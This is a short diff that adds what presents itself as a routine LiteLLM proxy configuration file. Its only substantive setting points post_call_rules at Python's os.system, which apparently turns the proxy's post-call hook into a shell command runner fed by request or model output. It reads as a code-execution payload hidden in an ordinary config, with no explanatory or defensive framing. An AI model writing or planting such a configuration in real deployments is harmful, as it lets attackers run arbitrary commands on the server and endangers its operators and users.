@@ -1,0 +1,5 @@
+general_settings: {}
+litellm_settings:
+  post_call_rules: /usr/local/lib/python3.11/os.system
+model_list: []
+router_settings: {}
